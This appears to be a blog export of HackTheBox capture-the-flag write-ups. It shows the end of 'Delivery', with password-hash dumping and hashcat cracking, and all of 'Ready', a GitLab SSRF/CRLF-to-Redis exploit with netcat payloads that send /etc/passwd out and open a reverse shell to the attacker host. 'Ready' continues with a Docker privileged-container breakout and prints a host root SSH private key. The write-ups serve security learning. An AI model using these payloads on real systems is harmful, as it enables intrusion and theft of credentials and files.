service.\nmaildeliverer@Delivery:/opt/mattermost/config$mysqlmattermost-ummuser-pCrack_The_MM_Admin_PWReadingtableinformationforcompletionoftableandcolumnnamesYoucanturnoffthisfeaturetogetaquickerstartupwith-AWelcometotheMariaDBmonitor.Commandsendwith;or\\g.YourMariaDBconnectionidis395Serverversion:10.3.27-MariaDB-0+deb10u1Debian10Copyright(c)2000,2018,Oracle,MariaDBCorporationAbandothers.Type\u0026#39;help;\u0026#39;or\u0026#39;\\h\u0026#39;forhelp.Type\u0026#39;\\c\u0026#39;toclearthecurrentinputstatement.MariaDB[mattermost]\u0026gt;There is a users table which usually contains something juicy.\nMariaDB[mattermost]\u0026gt;showtables;+------------------------+|Tables_in_mattermost|+------------------------+...|Users|+------------------------+46rowsinset(0.001sec)I can get the columns of the table user by querying describe Users;.\nMariaDB[mattermost]\u0026gt;describeUsers;+--------------------+--------------+------+-----+---------+-------+|Field|Type|Null|Key|Default|Extra|+--------------------+--------------+------+-----+---------+-------+|Id|varchar(26)|NO|PRI|NULL|||CreateAt|bigint(20)|YES|MUL|NULL|||UpdateAt|bigint(20)|YES|MUL|NULL|||DeleteAt|bigint(20)|YES|MUL|NULL|||Username|varchar(64)|YES|UNI|NULL|||Password|varchar(128)|YES||NULL||...+--------------------+--------------+------+-----+---------+-------+25rowsinset(0.001sec)I\u0026rsquo;ll dump that the username and password columns from the table Users.\nMariaDB[mattermost]\u0026gt;selectUsername,PasswordfromUsers;+----------------------------------+--------------------------------------------------------------+|Username|Password|+----------------------------------+--------------------------------------------------------------+|surveybot|||c3ecacacc7b94f909d04dbfd308a9b93|$2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK||5b785171bfb34762a933e127630c4860|$2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G||testmail|$2a$10$gSBaz3a76sX.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa||help|$2a$10$zsb4KbggZbpQi2Wa8W0.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm||root|$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO||ff0a21fc6fc2488195e16ea854c963ee|$2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq||channelexport|||9ecfb4be145d47fda0724f697f35ffaf|$2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm||aaaa|$2a$10$yIdqqOXl.5dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6||iiamf|$2a$10$esA8d/l5.IKQJIhnl2SeYeeoFaCOE6Z/esUOSuRb.Vqtkf3gvbli6||iamf|$2a$10$ZYEM.GLMnAfq8eM.2rs8q.e/q3bHaOVOCvlu7YGhU0rU0Ug4PME9a|+----------------------------------+--------------------------------------------------------------+12rowsinset(0.000sec)MariaDB[mattermost]\u0026gt;Those are bcrypt hashes, but let’s prioritize the root hash.\nCracking the Hash Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.\nI remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on Forest .\nNow the idea is instead of generating seasonal passwords, I can try to generate a few variant of \u0026ldquo;PleaseSubscribe!\u0026rdquo; and use them for cracking.\nSo, I\u0026rsquo;ll start by calculating the length of “PleaseSubscribe!”.\n→ root@kali «delivery» «10.10.14.70» $ echo -n \u0026#39;PleaseSubsribe!\u0026#39; | wc -c 15 It has length of 15. I\u0026rsquo;ll save the \u0026ldquo;PleaseSubscribe!\u0026rdquo; string to a file.\n→ root@kali «delivery» «10.10.14.70» $ echo \u0026#39;PleaseSubscribe!\u0026#39; \u0026gt; IppsecSubscriber Then I’ll feed that file to hashcat to generate some new variant of it using base64 rule, and I\u0026rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called custom_wordlist.\n→ root@kali «delivery» «10.10.14.70» $ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout | awk \u0026#39;length($0) \u0026gt; 15\u0026#39; \u0026gt; custom_wordlist It produces 46 words.\n→ root@kali «delivery» «10.10.14.70» $ wc -w custom_wordlist 46 custom_wordlist With that wordlist the hash gets cracked instantly!\nC:\\tools\\hashcat6\u0026gt;hashcat.exe -m 3200 \u0026#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO\u0026#39; custom_wordlist --force .... $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21 Session..........: hashcat Status...........: Cracked Hash.Name........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO Time.Started.....: Mon Mar 15 21:36:35 2021 (1 sec) Time.Estimated...: Mon Mar 15 21:36:36 2021 (0 secs) .... The recovered password is PleaseSubscribe!21.\nSU - root That password works on root user.\nmaildeliverer@Delivery:~$ su root Password: root@Delivery:/home/maildeliverer# id uid=0(root) gid=0(root) groups=0(root) Now I can just grab the root flag.\nroot@Delivery:/home/maildeliverer# cd ~ root@Delivery:~# ls -l total 16 -rwxr-x--- 1 root root 103 Dec 26 11:26 mail.sh -r-------- 1 root root 382 Dec 28 07:02 note.txt -rw-r----- 1 root root 1499 Dec 26 10:55 py-smtp.py -r-------- 1 root root 33 May 21 11:21 root.txt root@Delivery:~# cat *.txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I\u0026#39;ve seen several times. The inspiration for the box is here: - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don\u0026#39;t forget to subscribe to all the security streamers out there. - ippsec a7d68baadc3b3c072c6...\u0026lt;SNIP\u0026gt;... There is also a message from the box’s author:\nroot@Delivery:~# cat note.txt I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I\u0026#39;ve seen several times. The inspiration for the box is here: - https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c Keep on hacking! And please don\u0026#39;t forget to subscribe to all the security streamers out there.  References  https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-delivery/","summary":"Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by Inti De Ceukelaire.\nOn this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I\u0026rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system.","tags":["OSCP-like","Linux","TicketTrick","osTicket","Mattermost","Password-cracking","Hashcat"],"title":"HackTheBox - Delivery"},{"content":"Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I\u0026rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.\nSkills Learned  GitLab 11.4.7 exploitation Chaining bugs from CVE-2018-19571 and CVE-2018-19585 Docker security  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux BurpSuite - Preinstalled in Kali Linux  Reconnaissance Nmap All ports scan with nmap discovers two open ports: SSH on port 22, and a HTTP web server on port 5080\n→ root@kali «ready» «10.10.14.20» $ nmap -p- -sV --reason -oA nmap/10-initial-ready \u0026#39;10.10.10.220\u0026#39; Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-14 04:53 EDT Nmap scan report for 10.10.10.220 Host is up, received echo-reply ttl 63 (0.18s latency). Not shown: 65533 closed ports Reason: 65533 resets PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http syn-ack ttl 62 nginx Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 503.44 seconds After performing a default script scan shows there\u0026rsquo;s a GitLab instance on port 5080.\n→ root@kali «ready» «10.10.14.20» $ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-14 05:17 EDT Nmap scan report for 10.10.10.220 Host is up, received echo-reply ttl 63 (0.090s latency). PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 5080/tcp open http syn-ack ttl 62 nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds Enumeration TCP 5080 - GitLab The page displays a self-hosted GitLab Community Edition.\nI can register with any email domain.\nThe GitLab version can be seen by visiting/help, and it seems to be an outdated one.\nI\u0026rsquo;ll take a note on the version.\nUser Enumeration via GitLab API I can enumerate the GitLab users via /api/v4/users, but in the end, this was not used.\nI\u0026rsquo;ll move and search for vulnerabilities.\nSearchsploit I can feed the GitLab version to searchsploit, and it returns with two exploits that match with the version.\n→ root@kali «~» «10.10.14.20» $ searchsploit GitLab 11.4.7 -------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------- --------------------------------- GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py -------------------------------------------------------------------------- --------------------------------- I relaxed the search keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit Laboratory.\n→ root@kali «exploit» «10.10.14.20» $ searchsploit GitLab -------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------- --------------------------------- GitLab - \u0026#39;impersonate\u0026#39; Feature Privilege Escalation | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py GitLab 12.9.0 - Arbitrary File Read | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated) | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit) | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - \u0026#39;repository\u0026#39; Remote Command Execution | json/webapps/47420.txt -------------------------------------------------------------------------- --------------------------------- Foothold Shell as git GitLab 11.4.7 RCE (CVE-2018-19571 \u0026amp; CVE-2018-19585) - PoC The RCE exploit that was popped on searchsploit above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit\u0026rsquo;s author uses the LifeOverFlow\u0026rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.\nWith SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (# ==\u0026gt; is a comment by me)\nGET blablabla HTTP/1.1 # ==\u0026gt; Redis read this as a command Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 User-Agent: git/2.18.1 Accept: */* Accept-Encoding: deflate, gzip Pragma: no-cache - Err wrong number of arguments for \u0026#39;get\u0026#39; command The idea here is to use the CRLF Injection to insert a payload after the \u0026lsquo;GET\u0026rsquo; line.\nFor this, I’ll need Burp Suite turned on.\nOn GitLab, I’ll import a (non-exist) project and choose the \u0026ldquo;Repo by URL\u0026rdquo; menu.\nI\u0026rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ and add my (non-exist) .git repository at the end of the URL, so it becomes git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git\n The repository URL above is a special IPv6 address where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in spec/lib/gitlab/url_blocker_spec.rb\n I\u0026rsquo;ll intercept the request after I hit the “Create Project” button, and then on BurpSuite, I’ll modify the import URL to this:\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026#34;{\\\u0026#34;class\\\u0026#34;:\\\u0026#34;GitlabShellWorker\\\u0026#34;,\\\u0026#34;args\\\u0026#34;:[\\\u0026#34;class_eval\\\u0026#34;,\\\u0026#34;open(\\\u0026#39;|cat /etc/passwd | nc 10.10.14.20 9000\\\u0026#39;).read\\\u0026#34;],\\\u0026#34;retry\\\u0026#34;:3,\\\u0026#34;queue\\\u0026#34;:\\\u0026#34;system_hook_push\\\u0026#34;,\\\u0026#34;jid\\\u0026#34;:\\\u0026#34;ad52abc5641173e217eb2e52\\\u0026#34;,\\\u0026#34;created_at\\\u0026#34;:1513714403.8122594,\\\u0026#34;enqueued_at\\\u0026#34;:1513714403.8129568}\u0026#34; exec exec /ssrf-test.git So the HTTP request now looks like this:\nPOST /projects HTTP/1.1 Host: 10.10.10.220:5080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.220:5080/projects/new Content-Type: application/x-www-form-urlencoded Content-Length: 778 Connection: close Cookie: sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all Upgrade-Insecure-Requests: 1 utf8=%E2%9C%93\u0026amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D\u0026amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026#34;{\\\u0026#34;class\\\u0026#34;:\\\u0026#34;GitlabShellWorker\\\u0026#34;,\\\u0026#34;args\\\u0026#34;:[\\\u0026#34;class_eval\\\u0026#34;,\\\u0026#34;open(\\\u0026#39;|cat /etc/passwd | nc 10.10.14.20 9000\\\u0026#39;).read\\\u0026#34;],\\\u0026#34;retry\\\u0026#34;:3,\\\u0026#34;queue\\\u0026#34;:\\\u0026#34;system_hook_push\\\u0026#34;,\\\u0026#34;jid\\\u0026#34;:\\\u0026#34;ad52abc5641173e217eb2e52\\\u0026#34;,\\\u0026#34;created_at\\\u0026#34;:1513714403.8122594,\\\u0026#34;enqueued_at\\\u0026#34;:1513714403.8129568}\u0026#34; exec exec /ssrf-test.git\u0026amp;project%5Bci_cd_only%5D=false\u0026amp;project%5Bname%5D=SSRF+test\u0026amp;project%5Bnamespace_id%5D=5\u0026amp;project%5Bpath%5D=ssrf-test\u0026amp;project%5Bdescription%5D=\u0026amp;project%5Bvisibility_level%5D=0 After I hit the send button, my nc listener caught the file contents of /etc/passwd.\nroot@kali «exploit» «10.10.14.20» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 36612 ...\u0026lt;SNIP\u0026gt;... git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh dude:x:1000:1000::/home/dude:/bin/bash Weaponize - Reverse Shell From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.\ngit://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \u0026#34;{\\\u0026#34;class\\\u0026#34;:\\\u0026#34;GitlabShellWorker\\\u0026#34;,\\\u0026#34;args\\\u0026#34;:[\\\u0026#34;class_eval\\\u0026#34;,\\\u0026#34;open(\\\u0026#39;|nc -e /bin/bash 10.10.14.20 9000\\\u0026#39;).read\\\u0026#34;],\\\u0026#34;retry\\\u0026#34;:3,\\\u0026#34;queue\\\u0026#34;:\\\u0026#34;system_hook_push\\\u0026#34;,\\\u0026#34;jid\\\u0026#34;:\\\u0026#34;ad52abc5641173e217eb2e52\\\u0026#34;,\\\u0026#34;created_at\\\u0026#34;:1513714403.8122594,\\\u0026#34;enqueued_at\\\u0026#34;:1513714403.8129568}\u0026#34; exec exec /ssrf-to-rce.git On my nc listener:\n→ root@kali «exploit» «10.10.14.20» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 37306 id uid=998(git) gid=998(git) groups=998(git) hostname gitlab.example.com pwd /var/opt/gitlab/gitlab-rails/working Shell Upgrade I\u0026rsquo;ll do the \u0026lsquo;stty\u0026rsquo; trick to upgrade my shell.\nwhich python3 /opt/gitlab/embedded/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; git@gitlab:~/gitlab-rails/working$ ^Z [2] + 2354 suspended nc -nvlp 9000 → root@kali «exploit» «10.10.14.20» $ stty raw -echo; fg [2] - 2354 continued nc -nvlp 9000 git@gitlab:~/gitlab-rails/working$ git@gitlab:~/gitlab-rails/working$ export TERM=xterm On /home, there is only one user called dude, and I\u0026rsquo;m able to read the user flag there.\ngit@gitlab:/home/dude$ ls -la total 24 drwxr-xr-x 2 dude dude 4096 Dec 7 16:58 . drwxr-xr-x 1 root root 4096 Dec 2 10:45 .. lrwxrwxrwx 1 root root 9 Dec 7 16:58 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 dude dude 220 Aug 31 2015 .bash_logout -rw-r--r-- 1 dude dude 3771 Aug 31 2015 .bashrc -rw-r--r-- 1 dude dude 655 May 16 2017 .profile -r--r----- 1 dude git 33 Dec 2 10:46 user.txt git@gitlab:/home/dude$ cat user.txt e1e30b052b6ec0670698...\u0026lt;SNIP\u0026gt;... Privilege Escalation Shell as root Container enumeration I found a .dockerenv on the root directory which indicates that I\u0026rsquo;m inside container, and there is also a file called root_pass.\ngit@gitlab:~$ ls -la / total 104 drwxr-xr-x 1 root root 4096 Dec 1 12:41 . drwxr-xr-x 1 root root 4096 Dec 1 12:41 .. -rwxr-xr-x 1 root root 0 Dec 1 12:41 .dockerenv ...\u0026lt;SNIP\u0026gt;... -rw-r--r-- 1 root root 23 Jun 29 2020 root_pass The content of root_pass is a random string, which I think it is a password. I tried it to the user and root account but it didn\u0026rsquo;t work.\ngit@gitlab:/opt/backup$ cat /root_pass YG65407Bjqvv9A0a8Tm_7w Exploring on /opt, I found a folder called backup. The folder contains three files: docker-compose.yml, gitlab-secrets.json and gitlab.rb.\ngit@gitlab:/opt/backup$ ls -l total 100 -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15092 Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 79639 Dec 1 19:20 gitlab.rb Upon performing a recursive grep to search for files containing a \u0026ldquo;pass\u0026rdquo; string inside the folder, I discovered an SMTP password on gitlab.rb.\ngit@gitlab:/opt/backup$ grep -Ri \u0026#34;pass\u0026#34; ...\u0026lt;SNIP\u0026gt;... gitlab.rb:gitlab_rails[\u0026#39;smtp_password\u0026#39;] = \u0026#34;wW59U!ZKMbG9+*#h\u0026#34; ...\u0026lt;SNIP\u0026gt;... Looking into the docker-compose.yml, I see a potential vector for container breakout.\ngit@gitlab:/opt/backup$ cat docker-compose.yml version:\u0026#39;2.4\u0026#39;services:web:image:\u0026#39;gitlab/gitlab-ce:11.4.7-ce.0\u0026#39;restart:alwayshostname:\u0026#39;gitlab.example.com\u0026#39;environment:GITLAB_OMNIBUS_CONFIG:|external_url \u0026#39;http://172.19.0.2\u0026#39; redis[\u0026#39;bind\u0026#39;]=\u0026#39;127.0.0.1\u0026#39; redis[\u0026#39;port\u0026#39;]=6379 gitlab_rails[\u0026#39;initial_root_password\u0026#39;]=File.read(\u0026#39;/root_pass\u0026#39;)networks:gitlab:ipv4_address:172.19.0.2ports:- \u0026#39;5080:80\u0026#39;#- \u0026#39;127.0.0.1:5080:80\u0026#39;#- \u0026#39;127.0.0.1:50443:443\u0026#39;#- \u0026#39;127.0.0.1:5022:22\u0026#39;volumes:- \u0026#39;./srv/gitlab/config:/etc/gitlab\u0026#39;- \u0026#39;./srv/gitlab/logs:/var/log/gitlab\u0026#39;- \u0026#39;./srv/gitlab/data:/var/opt/gitlab\u0026#39;- \u0026#39;./root_pass:/root_pass\u0026#39;privileged:true# ==\u0026gt; Potential privesc vectorrestart:unless-stopped#mem_limit: 1024mnetworks:gitlab:driver:bridgeipam:config:- subnet:172.19.0.0/16su - root (container) The password wW59U!ZKMbG9+*#h works on the container root account\ngit@gitlab:/opt/gitlab$ su root Password: wW59U!ZKMbG9+*#h root@gitlab:/opt/gitlab# id uid=0(root) gid=0(root) groups=0(root) Docker Breakout Based on the docker-compose.yml file, I suspect the container is running with privileged flag. According to my favorite blog, which is BookHackTrick, a container with privileged flag will have access to the host devices.\nAlthough, --privileged gives all the Linux capabilities, I\u0026rsquo;ll still check it manually to make sure I have access to the host devices.\nroot@gitlab:/opt/gitlab# capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip ...\u0026lt;SNIP\u0026gt;... There is a CAP_SYS_ADMIN, with this capabilities I\u0026rsquo;m able to mount the host devices to make it available on the container. I can list all the host devices with fdisk -l.\nroot@gitlab:~# fdisk -l ...\u0026lt;SNIP\u0026gt;... Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: gpt Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E Device Start End Sectors Size Type /dev/sda1 2048 4095 2048 1M BIOS boot /dev/sda2 4096 37746687 37742592 18G Linux filesystem # the root (/) dir /dev/sda3 37746688 41940991 4194304 2G Linux swap Now I can simply mount the Linux filesystem (/dev/sda2) to my specified folder.\nroot@gitlab:/media# mkdir iamf root@gitlab:/media# mount /dev/sda2 /media/iamf root@gitlab:/media# ls iamf/ bin cdrom etc lib lib64 lost+found mnt proc run snap sys usr boot dev home lib32 libx32 media opt root sbin srv tmp var The root user of the host has SSH keys, I’ll grab only the private key to my machine.\nroot@gitlab:/media# ls -l iamf/root/.ssh/ total 12 -rw------- 1 root root 405 Dec 7 16:49 authorized_keys -rw------- 1 root root 1675 Dec 7 16:49 id_rsa -rw-r--r-- 1 root root 405 Dec 7 16:49 id_rsa.pub root@gitlab:/media# cat iamf/root/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn 6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011 YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+ lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2 3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8 kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1 KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY----- SSH Access - root (host) After changing the key permissions to 600, I can login as root user.\n→ root@kali «ssh-key» «10.10.14.20» $ chmod 600 root_rsa → root@kali «ssh-key» «10.10.14.20» $ ssh -i root_rsa root@10.10.10.220 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64) ...\u0026lt;SNIP\u0026gt;.. System load: 0.05 Usage of /: 67.1% of 17.59GB Memory usage: 84% Swap usage: 4% Processes: 434 Users logged in: 0 IPv4 address for br-bcb73b090b3f: 172.19.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.220 IPv6 address for ens160: dead:beef::250:56ff:feb9:211 ...\u0026lt;SNIP\u0026gt;.. Last login: Thu Feb 11 14:28:18 2021 root@ready:~# id uid=0(root) gid=0(root) groups=0(root) root@ready:~# ls -l total 16 drwxr-xr-x 3 root root 4096 Dec 1 12:41 docker-gitlab drwxr-xr-x 10 root root 4096 Jul 9 2020 ready-channel -r-------- 1 root root 33 Jul 8 2020 root.txt drwxr-xr-x 3 root root 4096 May 18 2020 snap I can also grab the root flag.\nroot@ready:~# cut -c-15 root.txt b7f98681505cd39  References  https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-ready/","summary":"Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I\u0026rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.","tags":["OSCP-like","Linux","GitLab","CVE-2018-19571","CVE-2018-19585","SSRF","CRLF-injection","Command-injection","Container","Docker","Docker-breakout"],"title":"HackTheBox - Ready"},{"content":"Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I\u0026rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is 